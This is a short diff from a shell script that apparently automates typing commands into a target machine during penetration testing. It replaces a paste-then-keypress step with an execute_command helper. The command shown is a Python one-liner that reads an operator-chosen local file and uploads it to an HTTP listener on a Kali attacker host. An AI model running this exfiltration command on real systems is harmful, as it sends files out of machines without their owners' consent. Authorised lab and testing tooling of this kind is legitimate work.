@@ -14,5 +14,5 @@ generate_form "${SERVER_PORT_FIELD}" "${LOCAL_FILE_FIELD}"
 SERVER_PORT=${form_data["server_port"]}
 LOCAL_FILE=${form_data["local_file_location"]}
 
-paste_command "python3 -c 'import requests;requests.post(\"http://${KALI_IP}:${PORT}/upload\",files={\"files\":open(\"${LOCAL_FILE}\",\"rb\")})'"
-xdotool key Return
+execute_command "python3 -c 'import requests;requests.post(\"http://${KALI_IP}:${PORT}/upload\",files={\"files\":open(\"${LOCAL_FILE}\",\"rb\")})'"
+create_new_line
